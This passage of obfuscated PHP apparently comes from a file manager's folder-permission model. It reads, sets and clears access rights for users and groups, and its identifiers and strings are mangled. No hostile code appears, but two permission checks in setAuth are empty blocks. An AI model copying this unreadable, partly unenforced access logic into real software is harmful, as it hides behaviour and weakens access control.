$§¨‹ÍÚá[566] => 1); $¹çÜãÜ = $this->where($Ô›Ã›²ë)->field($§¨‹ÍÚá[672])->select(); if (empty($¹çÜãÜ)) { return; } $Ò®¸ïõú = array_to_keyvalue($¹çÜãÜ, $§¨‹ÍÚá[12], $§¨‹ÍÚá[672]); $this->remove($Ò®¸ïõú); } private function shareFileMeta($ÏÉ¾Õµä, $¬œ©Æ¹Á = null) { $ˆœ«¿«á =& $_SERVER[ıÚ˜š²İ]; $¼²À¦×Ô = array($ˆœ«¿«á[545] => $ÏÉ¾Õµä, $ˆœ«¿«á[97] => $ˆœ«¿«á[2181]); if (is_null($¬œ©Æ¹Á)) { return Model($ˆœ«¿«á[2182])->where($¼²À¦×Ô)->find(); } $¼²À¦×Ô[$ˆœ«¿«á[452]] = $¬œ©Æ¹Á; Model($ˆœ«¿«á[2182])->add($¼²À¦×Ô, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\x63\x65\x5f\x61\165\164\150"; public function getAuth($ÄÂ‡°é) { $–‹Ë†÷ =& $_SERVER[ıÚ˜š²İ]; $Ğ±¨ÄÏª = $this->sourceAuthSelect($ÄÂ‡°é); $â®êµÍ… = array(); $ˆõò— = array(); $¤†Ôá­Ë = 2 << 25; foreach ($Ğ±¨ÄÏª as $úÑÕò‡ç) { $«Õ±Â¥¹ = Model($–‹Ë†÷[575])->listData($úÑÕò‡ç[$–‹Ë†÷[2102]]); if (!$«Õ±Â¥¹) { continue; } $â®êµÍ…[] = $úÑÕò‡ç; $Çò¾ªì = 0; if ($úÑÕò‡ç[$–‹Ë†÷[191]] == SourceModel::TYPE_GROUP) { $Çò¾ªì = $¤†Ôá­Ë * 2; } if ($úÑÕò‡ç[$–‹Ë†÷[191]] == SourceModel::TYPE_USER) { $Çò¾ªì = $¤†Ôá­Ë; } if ($úÑÕò‡ç[$–‹Ë†÷[191]] == SourceModel::TYPE_USER && $úÑÕò‡ç[$–‹Ë†÷[573]] == $–‹Ë†÷[231]) { $Çò¾ªì = 0; } $ˆõò—[] = $«Õ±Â¥¹[$–‹Ë†÷[489]] + $Çò¾ªì; } array_multisort($ˆõò—, SORT_DESC, $â®êµÍ…); return $â®êµÍ…; } public function sourceAuthSelect($ô¤­¿–) { $°ëòßË =& $_SERVER[ıÚ˜š²İ]; static $ÈÃ‰¿°ü = array(); $íØ¿Ü½À = is_array($ô¤­¿–) ? !1 : !0; if ($íØ¿Ü½À) { $ô¤­¿– = array($ô¤­¿–); } $¾ë¥ÜÇí = array(); foreach ($ô¤­¿– as $¸„Ñ¹õ) { if (isset($ÈÃ‰¿°ü[$¸„Ñ¹õ])) { $¾ë¥ÜÇí[$¸„Ñ¹õ] = $ÈÃ‰¿°ü[$¸„Ñ¹õ]; } } if (count($¾ë¥ÜÇí) == count($ô¤­¿–)) { return $íØ¿Ü½À ? $¾ë¥ÜÇí[$ô¤­¿–[0]] : $¾ë¥ÜÇí; } $ìË•àæ‡ = $°ëòßË[2183]; $´çº†ÜÈ = array($°ëòßË[194] => array($°ëòßË[7], $ô¤­¿–)); $‰‰ƒ” = $this->field($ìË•àæ‡)->order($°ëòßË[477])->where($´çº†ÜÈ)->select(); $îÄãÍ¯‰ = array_to_keyvalue_group($‰‰ƒ”, $°ëòßË[194]); foreach ($ô¤­¿– as $¸„Ñ¹õ) { $ÈÃ‰¿°ü[$¸„Ñ¹õ] = $îÄãÍ¯‰[$¸„Ñ¹õ] ? $îÄãÍ¯‰[$¸„Ñ¹õ] : array(); } if ($íØ¿Ü½À) { return $‰‰ƒ”; } return $îÄãÍ¯‰; } public function setAuth($ÍËÅ”Ä¾, $šß¥·‚) { $Š•ß÷‚ã =& $_SERVER[ıÚ˜š²İ]; $¯’ú€÷ş = Model($Š•ß÷‚ã[1442])->sourceInfo($ÍËÅ”Ä¾); if (!$¯’ú€÷ş) { return !1; } if ($¯’ú€÷ş[$Š•ß÷‚ã[191]] != SourceModel::TYPE_GROUP) { return !1; } $Ó‚’Œí = 1; $ÇÛ—õ  = $¯’ú€÷ş[$Š•ß÷‚ã[573]]; if ($ÇÛ—õ  != $Ó‚’Œí) { $º²çšÄ¼ = array($Š•ß÷‚ã[1404] => $ÇÛ—õ ); $…êüóÌ¸ = Model($Š•ß÷‚ã[2088])->field($Š•ß÷‚ã[1792])->where($º²çšÄ¼)->select(); $…êüóÌ¸ = array_to_keyvalue($…êüóÌ¸, $Š•ß÷‚ã[12], $Š•ß÷‚ã[1792]); } $øú€¼Ù› = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ì‹—˜›Ã = array(); foreach ($šß¥·‚ as $ô€ÓéÖ¤) { if (!in_array($ô€ÓéÖ¤[$Š•ß÷‚ã[191]], $øú€¼Ù›)) { show_json(LNG($Š•ß÷‚ã[2184]), !1); } if ($ÇÛ—õ  != $Ó‚’Œí) { if ($ô€ÓéÖ¤[$Š•ß÷‚ã[191]] == SourceModel::TYPE_GROUP) { } if ($ô€ÓéÖ¤[$Š•ß÷‚ã[573]] != 0 && !in_array($ô€ÓéÖ¤[$Š•ß÷‚ã[573]], $…êüóÌ¸)) { } } if ($ô€ÓéÖ¤[$Š•ß÷‚ã[573]] == 0) { $ô€ÓéÖ¤[$Š•ß÷‚ã[191]] = SourceModel::TYPE_USER; } $ì‹—˜›Ã[] = array($Š•ß÷‚ã[194] => $ÍËÅ”Ä¾, $Š•ß÷‚ã[191] => intval($ô€ÓéÖ¤[$Š•ß÷‚ã[191]]), $Š•ß÷‚ã[573] => intval($ô€ÓéÖ¤[$Š•ß÷‚ã[573]]), $Š•ß÷‚ã[2102] => intval($ô€ÓéÖ¤[$Š•ß÷‚ã[2102]]) ? intval($ô€ÓéÖ¤[$Š•ß÷‚ã[2102]]) : 0, $Š•ß÷‚ã[2166] => intval($ô€ÓéÖ¤[$Š•ß÷‚ã[2166]]) ? intval($ô€ÓéÖ¤[$Š•ß÷‚ã[2166]]) : -1); } $this->where(array($Š•ß÷‚ã[493] => $ÍËÅ”Ä¾))->delete(); $this->addAll($ì‹—˜›Ã); return !0; } public function authClear($åä™¢ğÍ) { $“ÊäÓÁ¶ =& $_SERVER[ıÚ˜š²İ]; $¸˜ÑÉñ  = Model($“ÊäÓÁ¶[1442])->sourceInfo($åä™¢ğÍ); $€¶Ÿû–æ = array($åä™¢ğÍ); if ($¸˜ÑÉñ [$“ÊäÓÁ¶[487]] == $“ÊäÓÁ¶[91]) { $İ…¾÷ş¿ = array($“ÊäÓÁ¶[659] => array($“ÊäÓÁ¶[619], $¸˜ÑÉñ [$“ÊäÓÁ¶[588]] . $åä™¢ğÍ . $“ÊäÓÁ¶[620])); $€¶Ÿû–æ = Model($“ÊäÓÁ¶[1442])->field($“ÊäÓÁ¶[493])->where($İ…¾÷ş¿)->getField($“ÊäÓÁ¶[194], !0); $€¶Ÿû–æ[] = $åä™¢ğÍ; } $this->where(array($“ÊäÓÁ¶[493] => array($“ÊäÓÁ¶[494], $€¶Ÿû–æ)))->delete(); return !0; } public function getAllChildren($¶Ò«©©Í) { $Ÿ’‚²ÎË =& $_SERVER[ıÚ˜š²İ]; $÷Ã…¥’ = Model($Ÿ’‚²ÎË[1442])->sourceInfo($¶Ò«©©Í); if ($÷Ã…¥’[$Ÿ’‚²ÎË[487]] != $Ÿ’‚²ÎË[91]) { return $this->sourceListAuth(array($¶Ò«©©Í)); } if ($÷Ã…¥’[$Ÿ’‚²ÎË[191]] != SourceModel::TYPE_GROUP) { return array(); } $ˆ—äÏÔ¾ = 1; $ÃË•ÏÇé = array($¶Ò«©©Í); if ($÷Ã…¥’[$Ÿ’‚²ÎË[193]] == $Ÿ’‚²ÎË[231] && $÷Ã…¥’[$Ÿ’‚²ÎË[573]] != $ˆ—äÏÔ¾) { $ÃË•ÏÇé = $this->groupChidldAllRootSource($÷Ã…¥’[$Ÿ’‚²ÎË[573]]); } $©ŸÑÊÎÀ = $this->field($Ÿ’‚²ÎË[194])->group($Ÿ’‚²ÎË[194])->select(); $©ŸÑÊÎÀ = array_to_keyvalue($©ŸÑÊÎÀ, $Ÿ’‚²ÎË[12], $Ÿ’‚²ÎË[194]); if (!$©ŸÑÊÎÀ) { return array(); } $­‰ÈäÂè = $Ÿ’‚²ÎË[2185]; $ˆš˜áŠ€ = array($Ÿ’‚²ÎË[194] => array($Ÿ’‚²ÎË[7], $©ŸÑÊÎÀ), $Ÿ’‚²ÎË[507] => $Ÿ’‚²ÎË[231]); $¶¬¼õîÆ = Model($Ÿ’‚²ÎË[907])->field($­‰ÈäÂè)->where($ˆš˜áŠ€)->select(); $–ŒŸÆ®æ = array($¶Ò«©©Í); foreach ($¶¬¼õîÆ as $«ÆğĞ³Ø) { foreach ($ÃË•ÏÇé as $ış©ÅôŒ) { $Ÿ—¤” = $Ÿ’‚²ÎË[50] . $ış©ÅôŒ . $Ÿ’‚²ÎË[50]; $À¸’’² = $«ÆğĞ³Ø[$Ÿ’‚²ÎË[588]] . $«ÆğĞ³Ø[$Ÿ’‚²ÎË[194]] . $Ÿ’‚²ÎË[50]; if (strstr($À¸’’², $Ÿ—¤”)) { $–ŒŸÆ®æ[] = $«ÆğĞ³Ø[$Ÿ’‚²ÎË[194]]; break; } } } return $this->sourceListAuth($–ŒŸÆ®æ); } private function sourceListAuth($õí—äÓ¡) { $Á±ŞäÑ¼ =& $_SERVER[ıÚ˜š²İ]; $…’ÒËÕ = Model($Á±ŞäÑ¼[1442])->sourceListInfo($õí—äÓ¡, !0); $—§ê€¹¤ = $this->sourceAuthSelect($õí—äÓ¡); $ÔéÎô­ = array(); $Îº÷Ë¹Ê = array(); foreach ($…’ÒËÕ as $à«é¯ŠŠ) { unset($à«é¯ŠŠ[$Á±ŞäÑ¼[531]]); unset($à«é¯ŠŠ[$Á±ŞäÑ¼[529]]); unset($à«é¯ŠŠ[$Á±ŞäÑ¼[489]]); unset($à«é¯ŠŠ[$Á±ŞäÑ¼[90]]); $¸ˆÊÏùÀ = $—§ê€¹¤[$à«é¯ŠŠ[$Á±ŞäÑ¼[194]]]; if (!$¸ˆÊÏùÀ) { continue; } $à«é¯ŠŠ[$Á±ŞäÑ¼[2186]] = $this->authTargetInfo($¸ˆÊÏùÀ); $à«é¯ŠŠ[$Á±ŞäÑ¼[586]] = rtrim($à«é¯ŠŠ[$Á±ŞäÑ¼[592]], $Á±ŞäÑ¼[8]) . $Á±ŞäÑ¼[8] . ltrim($à«é¯ŠŠ[$Á±ŞäÑ¼[586]], $Á±ŞäÑ¼[8]); $ÔéÎô­[] = $à«é¯ŠŠ; $óİßªó = count(explode($Á±ŞäÑ¼[8], trim($à«é¯ŠŠ[$Á±ŞäÑ¼[586]], $Á±ŞäÑ¼[8]))); $Îº÷Ë¹Ê[] = $óİßªó + ($à«é¯ŠŠ[$Á±ŞäÑ¼[33]] == $Á±ŞäÑ¼[78] ? 0 : 1000); } array_multisort($Îº÷Ë¹Ê, SORT_ASC, $ÔéÎô­); return $ÔéÎô­; } private function groupChidldAllRootSource($Ä¯ºÑ‘Å) { $€÷îæ =& $_SERVER[ıÚ˜š²İ]; $¤Ê¢ş˜Á = Model($€÷îæ[1402])->groupChildrenAll($Ä¯ºÑ‘Å); $„ŞÁÎ ² = array($€÷îæ[193] => 0, $€÷îæ[573] => array($€÷îæ[7], $¤Ê¢ş˜Á), $€÷îæ[191] => SourceModel::TYPE_GROUP); $À›‰Ø›½ = Model($€÷îæ[907])->field($€÷îæ[194])->where($„ŞÁÎ ²)->select(); $À›‰Ø›½ = array_to_keyvalue($À›‰Ø›½, $€÷îæ[12], $€÷îæ[194]); return $À›‰Ø›½; } private function authTargetInfo($—æıñÑƒ) { $åòË›â =& $_SERVER[ıÚ˜š²İ]; $áŠÆ®ë = array(); $ˆöÀâá = array(); $áĞŠ¾´Ä = 2 << 25; foreach ($—æıñÑƒ as $å¼ƒéü) { $¢Ûï°ß = Model($åòË›â[575])->listData($å¼ƒéü[$åòË›â[2102]]); if (!$¢Ûï°ß) { continue; } if ($å¼ƒéü[$åòË›â[191]] == SourceModel::TYPE_USER) { $Äˆ«°ÛÕ = Model($åòË›â[581])->getInfoSimpleOuter($å¼ƒéü[$åòË›â[573]]); if ($Äˆ«°ÛÕ[$åòË›â[1792]] == $åòË›â[1287]) { continue; } if ($Äˆ«°ÛÕ[$åòË›â[1792]] == $åòË›â[231]) { $Äˆ«°ÛÕ[$åòË›â[32]] = LNG($åòË›â[2187]); } } else { $Äˆ«°ÛÕ = Model($åòË›â[589])->getInfoSimple($å¼ƒéü[$åòË›â[573]]); } if (!$Äˆ«°ÛÕ) { continue; } $Äˆ«°ÛÕ[$åòË›â[544]] = $¢Ûï°ß; $áŠÆ®ë[] = $Äˆ«°ÛÕ; $³Ñ¶«Ï¡ = 0; if ($å¼ƒéü[$åòË›â[191]] == SourceModel::TYPE_GROUP) { $³Ñ¶«Ï¡ = $áĞŠ¾´Ä * 2; } if ($å¼ƒéü[$åòË›â[191]] == SourceModel::TYPE_USER) { $³Ñ¶«Ï¡ = $áĞŠ¾´Ä; } if ($å¼ƒéü[$åòË›â[191]] == SourceModel::TYPE_USER && $å¼ƒéü[$åòË›â[573]] == $åòË›â[231]) { $³Ñ¶«Ï¡ = 0; } $ˆöÀâá[] = $¢Ûï°ß[$åòË›â[489]] + $³Ñ¶«Ï¡; } array_multisort($ˆöÀâá, SORT_DESC, $áŠÆ®ë); return $áŠÆ®ë; } public function getAllChildrenByUser($Èªì‹Ôê, $‡úâ¹¨) { $²ÀüÌ£ =& $_SERVER[ıÚ˜š²İ]; $îø™Ö¡· = Model($²ÀüÌ£[601])->getInfo($‡úâ¹¨); if (!$‡úâ¹¨ || !$Èªì‹Ôê || !$îø™Ö¡·) { return array(); } $±†¸ŞÅã = Model($²ÀüÌ£[1442])->sourceInfo($Èªì‹Ôê); $é¤ò¼ ‹ = array(); $»Üå‡êæ = 1; if ($±†¸ŞÅã[$²ÀüÌ£[193]] == $²ÀüÌ£[231] && $±†¸ŞÅã[$²ÀüÌ£[573]] != $»Üå‡êæ && $this->groupContainUser($±†¸ŞÅã[$²ÀüÌ£[573]], $‡úâ¹¨)) { foreach ($îø™Ö¡·[$²ÀüÌ£[1403]] as $‘ŸÂï ) { $¸Èó¡Ù¤ = Model($²ÀüÌ£[589])->getInfo($‘ŸÂï [$²ÀüÌ£[1404]]); $ËœË—Â = Model($²ÀüÌ£[601])->getInfoSimpleOuter($‡úâ¹¨); $ËœË—Â[$²ÀüÌ£[544]] = $‘ŸÂï [$²ÀüÌ£[489]]; if (Model($²ÀüÌ£[575])->authCheckAction($‘ŸÂï [$²ÀüÌ£[489]][$²ÀüÌ£[489]], $²ÀüÌ£[2014])) { continue; } $ñˆöéó• = array($²ÀüÌ£[32] => $²ÀüÌ£[1307] . $¸Èó¡Ù¤[$²ÀüÌ£[32]], $²ÀüÌ£[194] => $¸Èó¡Ù¤[$²ÀüÌ£[90]][$²ÀüÌ£[194]], $²ÀüÌ£[87] => KodIO::make($¸Èó¡Ù¤[$²ÀüÌ£[90]][$²ÀüÌ£[194]]), $²ÀüÌ£[193] => $²ÀüÌ£[231], $²ÀüÌ£[191] => $²ÀüÌ£[582], $²ÀüÌ£[33] => $²ÀüÌ£[623], $²ÀüÌ£[586] => $¸Èó¡Ù¤[$²ÀüÌ£[593]], $²ÀüÌ£[1404] => $¸Èó¡Ù¤[$²ÀüÌ£[1404]], $²ÀüÌ£[590] => $¸Èó¡Ù¤[$²ÀüÌ£[193]], $²ÀüÌ£[2186] => array($ËœË—Â)); $é¤ò¼ ‹[$ñˆöéó•[$²ÀüÌ£[194]]] = $ñˆöéó•; } } $Í¼—Æ¼ = array(); $É€ÕŞÖô = $this->getAllChildren($Èªì‹Ôê); foreach ($É€ÕŞÖô as $Ê²½œø³) { $ç¾øÒ = !1; foreach ($Ê²½œø³[$²ÀüÌ£[2186]] as $ºù¥÷˜œ) { if ($ºù¥÷˜œ[$²ÀüÌ£[1792]]) { if ($ºù¥÷˜œ[$²ÀüÌ£[1792]] == $‡úâ¹¨) { $ç¾øÒ = !0; break; } } if ($ºù¥÷˜œ[$²ÀüÌ£[1404]]) { if ($this->groupContainUser($ºù¥÷˜œ[$²ÀüÌ£[1404]], $‡úâ¹¨)) { $ç¾øÒ = !0; break; } } } if ($ç¾øÒ) { $Í¼—Æ¼[] = $Ê²½œø³; } $¿˜µ¥¿Ü = $Ê²½œø³[$²ÀüÌ£[194]]; if (isset($é¤ò¼ ‹[$¿˜µ¥¿Ü])) { $Ê²½œø³[$²ÀüÌ£[2186]][] = $é¤ò¼ ‹[$¿˜µ¥¿Ü][0]; $é¤ò¼ ‹[$¿˜µ¥¿Ü] = !1; } } $é¤ò¼ ‹ = array_filter(array_values($é¤ò¼ ‹)); $Í¼—Æ¼ = array_merge($é¤ò¼ ‹, $Í¼—Æ¼); return $Í¼—Æ¼; } public function setAllChildrenByUser($‡ß ¾ú, $ıËÛıÔÚ, $µáë¿î) { $˜º¢ÌÜÙ =& $_SERVER[ıÚ˜š²İ]; $ÚœŸËı = $this->getAllChildrenByUser($‡ß ¾ú, $ıËÛıÔÚ); if (!$µáë¿î || !$ÚœŸËı) { return !1; } foreach ($ÚœŸËı as $¹©£öò˜) { $¹àÕÕª¶ = array(); foreach ($¹©£öò˜[$˜º¢ÌÜÙ[2186]] as $İêÔ’À•) { $ÄÎñé­Í = $İêÔ’À•[$˜º¢ÌÜÙ[544]]; $ê”˜’ö” = $İêÔ’À•[$˜º¢ÌÜÙ[1792]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÎŸ ±¸„ = $İêÔ’À•[$˜º¢ÌÜÙ[1792]] ? $İêÔ’À•[$˜º¢ÌÜÙ[1792]] : $İêÔ’À•[$˜º¢ÌÜÙ[1404]]; if ($İêÔ’À•[$˜º¢ÌÜÙ[1792]] && $İêÔ’À•[$˜º¢ÌÜÙ[1792]] == $ıËÛıÔÚ) { continue; } $¹àÕÕª¶[] = array($˜º¢ÌÜÙ[194] => $¹©£öò˜[$˜º¢ÌÜÙ[194]], $˜º¢ÌÜÙ[191] => $ê”˜’ö”, $˜º¢ÌÜÙ[573] => intval($ÎŸ ±¸„), $˜º¢ÌÜÙ[2102] => isset($ÄÎñé­Í[$˜º¢ÌÜÙ[477]]) ? intval($ÄÎñé­Í[$˜º¢ÌÜÙ[477]]) : 0, $˜º¢ÌÜÙ[2166] => isset($ÄÎñé­Í[$˜º¢ÌÜÙ[2166]]) ? intval($ÄÎñé­Í[$˜º¢ÌÜÙ[2166]]) : -1); } $¹àÕÕª¶[] = array($˜º¢ÌÜÙ[194] => $¹©£öò˜[$˜º¢ÌÜÙ[194]], $˜º¢ÌÜÙ[191] => SourceModel::TYPE_USER, $˜º¢ÌÜÙ[573] => intval($ıËÛıÔÚ), $˜º¢ÌÜÙ[2102] => intval($µáë¿î), $˜º¢ÌÜÙ[2166] => -1); $this->where(array($˜º¢ÌÜÙ[493] => $¹©£öò˜[$˜º¢ÌÜÙ[194]]))->delete(); $this->addAll($¹àÕÕª¶); } return !0; } public function get($“¡£ËÕñ) { $µ²Ì³â½ = $this->getSourceList(array($“¡£ËÕñ), !0); return $µ²Ì³â½[0]; } public function getSourceList($¶×öíúÈ, $¥¦É÷æ› = false, $ı±òÄúŒ = false) { $•©´•”à =& $_SERVER[ıÚ˜š²İ]; if (!$¶×öíúÈ) { return array(); } $“ÓÉÄè© = Model($•©´•”à[1442]); if (!$¥¦É÷æ› && count($¶×öíúÈ) == 1) { $¥¦É÷æ› = array(); $¥¦É÷æ›[$¶×öíúÈ[0]] = $“ÓÉÄè©->sourceInfo($¶×öíúÈ[0]); } if (!$¥¦É÷æ›) { $šê×‹¾” = array($•©´•”à[493] => array($•©´•”à[494], $¶×öíúÈ)); $¥¦É÷æ› = $“ÓÉÄè©->field($•©´•”à[2188])->where($šê×‹¾”)->select(); $¥¦É÷æ› = array_to_keyvalue($¥¦É÷æ›, $•©´•”à[194]); } $àë²—•ª = $¶×öíúÈ; foreach ($¥¦É÷æ› as $ÛÛÅğÀè => $½µˆÑ‡Œ) { $„Ë¢¨¯Ú = $“ÓÉÄè©->parentLevelArray($½µˆÑ‡Œ[$•©´•”à[588]]); $àë²—•ª = array_merge($àë²—•ª, array($ÛÛÅğÀè), array_reverse($„Ë¢¨¯Ú)); } $àë²—•ª = array_values(array_unique($àë²—•ª)); if (!$àë²—•ª) { return array(); } $ÊÁ×¾ŒÄ = $this->sourceAuthSelect($àë²—•ª); $º›éÑª = array(); foreach ($àë²—•ª as $¬ì«ã¹Ó) { if (isset($ÊÁ×¾ŒÄ[$¬ì«ã¹Ó])) { $º›éÑª[$¬ì«ã¹Ó] = $ÊÁ×¾ŒÄ[$¬ì«ã¹Ó]; } } $ÆâÊ‡Î = $this->userIsRoot($ı±òÄúŒ); $Ğ²¾¬ë = AuthModel::authAll(); $ıšÙ„Üß = array($•©´•”à[490] => $Ğ²¾¬ë, $•©´•”à[2189] => array($•©´•”à[495] => 0, $•©´•”à[1999] => $Ğ²¾¬ë, $•©´•”à[496] => LNG($•©´•”à[2190]), $•©´•”à[2016] => $•©´•”à[2191])); $Şı¬ûÏ¥ = array(); foreach ($¥¦É÷æ› as $¬ì«ã¹Ó => $­‚äëÚš) { if ($ÆâÊ‡Î && $GLOBALS[$•©´•”à[6]][$•©´•”à[2012]]) { $Şı¬ûÏ¥[$¬ì«ã¹Ó] = $ıšÙ„Üß; continue; } $Şı¬ûÏ¥[$¬ì«ã¹Ó] = $this->makeSourceAuth($­‚äëÚš, $º›éÑª, $ı±òÄúŒ); } return $Şı¬ûÏ¥; } public function authDeepCheck($Á±Äı’, $˜ÛÁõ­€ = false) { $†ç±˜˜Ë =& $_SERVER[ıÚ˜š²İ]; $˜ÛÁõ­€ = $˜ÛÁõ­€ ? $˜ÛÁõ­€ : USER_ID; $‡Ú¬”æú = $this->makeAuthDeep($˜ÛÁõ­€); if (!in_array($Á±Äı’, $‡Ú¬”æú[$†ç±˜˜Ë[2192]])) { return !1; } $ÕºÖÖæ• = array(); foreach ($‡Ú¬”æú[$†ç±˜˜Ë[2193]] as $¥¶²âÕÑ => $Ë•Õüå) { if (!in_array($Á±Äı’, $Ë•Õüå)) { continue; } $ÕºÖÖæ•[] = $¥¶²âÕÑ; } if (!$ÕºÖÖæ•) { return !1; } $îª¬ ± = $ÕºÖÖæ• ? $ÕºÖÖæ•[0] : $Á±Äı’; return array($†ç±˜˜Ë[490] => -1, $†ç±˜˜Ë[544] => array($†ç±˜˜Ë[495] => $†ç±˜˜Ë[1287], $†ç±˜˜Ë[1999] => $†ç±˜˜Ë[231], $†ç±˜˜Ë[496] => LNG($†ç±˜˜Ë[2194]), $†ç±˜˜Ë[2016] => $†ç±˜˜Ë[2195]), $†ç±˜˜Ë[2196] => LNG($†ç±˜˜Ë[2197]), $†ç±˜˜Ë[2198] => $this->sourceAuthInfo($îª¬ ±)); } protected function makeAuthDeep($œúŒŠï¯ = false) { $ËÑ¡ƒ» =& $_SERVER[ıÚ˜š²İ]; static $¸ßşÍü‹ = array(); $œúŒŠï¯ = $œúŒŠï¯ ? $œúŒŠï¯ : USER_ID; if (isset($¸ßşÍü‹[$œúŒŠï¯])) { return $¸ßşÍü‹[$œúŒŠï¯]; } $†·‹ğ«ß = Model($ËÑ¡ƒ»[2199])->listData(); $ßŸÃœÊ‰ = array(); foreach ($†·‹ğ«ß as $äòÄ«¯ß) { if ($äòÄ«¯ß[$ËÑ¡ƒ»[489]] == 0 && $äòÄ«¯ß[$ËÑ¡ƒ»[2015]] == $ËÑ¡ƒ»[91]) { $ßŸÃœÊ‰[] = $äòÄ«¯ß[$ËÑ¡ƒ»[477]]; } } $Ò¿»€½ò = $this->userGroupParents($œúŒŠï¯); $û­†ûƒ = array($ËÑ¡ƒ»[191] => SourceModel::TYPE_USER, $ËÑ¡ƒ»[573] => $œúŒŠï¯); if ($Ò¿»€½ò) { $û­†ûƒ = array(array($ËÑ¡ƒ»[191] => SourceModel::TYPE_USER, $ËÑ¡ƒ»[573] => $œúŒŠï¯), array($ËÑ¡ƒ»[191] => SourceModel::TYPE_GROUP, $ËÑ¡ƒ»[573] => array($ËÑ¡ƒ»[494], $Ò¿»€½ò)), $ËÑ¡ƒ»[1089] => $ËÑ¡ƒ»[2096]); } $Öè‹ŒÏÜ = $this->field($ËÑ¡ƒ»[2200])->where($û­†ûƒ)->select(); $º´Ğ¹œ˜ = array(); $„Ô‹Şëö = array_to_keyvalue_group($Öè‹ŒÏÜ, $ËÑ¡ƒ»[194]); foreach ($„Ô‹Şëö as $ŒÃÈŠ–Ü => $ºäºÔ—Ö) { $ÑºÌåÍï = $this->authArrayCheck($ºäºÔ—Ö, $œúŒŠï¯); if ($ÑºÌåÍï[$ËÑ¡ƒ»[490]] > 0) { $º´Ğ¹œ˜[] = $ŒÃÈŠ–Ü . $ËÑ¡ƒ»[12]; } } if ($Ò¿»€½ò) { $Õé±Ğ’ş = Model($ËÑ¡ƒ»[589]); foreach ($Ò¿»€½ò as $Ò®óÖÄÉ) { $áµÈïÒı = $Õé±Ğ’ş->getInfo($Ò®óÖÄÉ); if (!$áµÈïÒı || !is_array($áµÈïÒı[$ËÑ¡ƒ»[90]])) { continue; } $º´Ğ¹œ˜[] = $áµÈïÒı[$ËÑ¡ƒ»[90]][$ËÑ¡ƒ»[194]]; } } $º”ô‘Ïó = array(); $§´ÉÎì = $Ò¿»€½ò; $Äç¶ó¼Ä = Model($ËÑ¡ƒ»[1442]); $Õé±Ğ’ş = Model($ËÑ¡ƒ»[589]); $¡ÑîÔº¨ = array(); $¦¿è±úí = array(); $‚Ôıí±ó = array(); $ûæèÑ¤ = array(); if ($º´Ğ¹œ˜) { $ÛçûÖÆª = $Äç¶ó¼Ä->where(array($ËÑ¡ƒ»[194] => array($ËÑ¡ƒ»[494], $º´Ğ¹œ˜)))->select(); foreach ($ÛçûÖÆª as $¼ü¢ıÌÂ) { if ($¼ü¢ıÌÂ[$ËÑ¡ƒ»[507]] == $ËÑ¡ƒ»[91]) { continue; } $˜ğŞ´² = $Äç¶ó¼Ä->parentLevelArray($¼ü¢ıÌÂ[$ËÑ¡ƒ»[588]]); $º”ô‘Ïó = array_merge($º”ô‘Ïó, $˜ğŞ´²); $§´ÉÎì[] = $¼ü¢ıÌÂ[$ËÑ¡ƒ»[573]]; $¡ÑîÔº¨[$¼ü¢ıÌÂ[$ËÑ¡ƒ»[194]]] = $˜ğŞ´²; $¦¿è±úí[$¼ü¢ıÌÂ[$ËÑ¡ƒ»[194]]] = $¼ü¢ıÌÂ[$ËÑ¡ƒ»[573]]; } } $§´ÉÎì = array_values(array_unique($§´ÉÎì)); $‘Ù¢ı¢¤ = $§´ÉÎì; foreach ($‘Ù¢ı¢¤ as $Ò®óÖÄÉ) { $áµÈïÒı = $Õé±Ğ’ş->getInfo($Ò®óÖÄÉ); $˜ğŞ´² = $Äç¶ó¼Ä->parentLevelArray($áµÈïÒı[$ËÑ¡ƒ»[588]]); $§´ÉÎì = array_merge($§´ÉÎì, $˜ğŞ´²); } $§´ÉÎì = array_values(array_unique($§´ÉÎì)); foreach ($§´ÉÎì as $Ò®óÖÄÉ) { $áµÈïÒı = $Õé±Ğ’ş->getInfo($Ò®óÖÄÉ); $º”ô‘Ïó[] = $áµÈïÒı[$ËÑ¡ƒ»[90]][$ËÑ¡ƒ»[194]]; $‚Ôıí±ó[$Ò®óÖÄÉ] = $áµÈïÒı[$ËÑ¡ƒ»[90]][$ËÑ¡ƒ»[194]]; $ûæèÑ¤[$Ò®óÖÄÉ] = $Äç¶ó¼Ä->parentLevelArray($áµÈïÒı[$ËÑ¡ƒ»[588]]); } foreach ($¡ÑîÔº¨ as $Û¦µ¨øè => $ÂÏëëÂù) { $ƒËşê›² = $¦¿è±úí[$Û¦µ¨øè]; if (!$ƒËşê›² || !$‚Ôıí±ó[$ƒËşê›²]) { continue; } $šè”Š— = array(); foreach ($ûæèÑ¤[$ƒËşê›²] as $Ò®óÖÄÉ) { $šè”Š—[] = $‚Ôıí±ó[$Ò®óÖÄÉ]; } $¡ÑîÔº¨[$Û¦µ¨øè] = array_merge($šè”Š—, $ÂÏëëÂù); } $º”ô‘Ïó = array_values(array_unique($º”ô‘Ïó)); $ª™•öìº = array($ËÑ¡ƒ»[2192] => $º”ô‘Ïó, $ËÑ¡ƒ»[2193] => $¡ÑîÔº¨); $¸ßşÍü‹[$œúŒŠï¯] = $ª™•öìº; return $ª™•öìº; } private function makeSourceAuth($ó½ÁÁùš, $Õíûµ», $©Çà±›ß = false) { $¾”—ƒ«¦ =& $_SERVER[ıÚ˜š²İ]; $ø¿Í”Œ” = $¾”—ƒ«¦[91]; $’ÆÂ±–È = $ó½ÁÁùš[$¾”—ƒ«¦[573]]; $Ù÷¡·›ã = $ó½ÁÁùš[$¾”—ƒ«¦[191]] == SourceModel::TYPE_GROUP; $íÖô–°ª = $Ù÷¡·›ã ? $this->groupRootAuth($’ÆÂ±–È, $©Çà±›ß) : !1; if ($íÖô–°ª && Model($¾”—ƒ«¦[575])->authCheckAction($íÖô–°ª[$¾”—ƒ«¦[489]], $¾”—ƒ«¦[2014])) { return $this->groupAuthInfo($íÖô–°ª, $’ÆÂ±–È); } $Â‹ø¯ã  = Model($¾”—ƒ«¦[1442])->parentLevelArray($ó½ÁÁùš[$¾”—ƒ«¦[588]]); $Â‹ø¯ã  = array_merge(array($ó½ÁÁùš[$¾”—ƒ«¦[194]]), array_reverse($Â‹ø¯ã )); $¡ÃšÌ„¢ = !1; foreach ($Â‹ø¯ã  as $Ïã‡…ìÍ) { if (!isset($Õíûµ»[$Ïã‡…ìÍ])) { continue; } 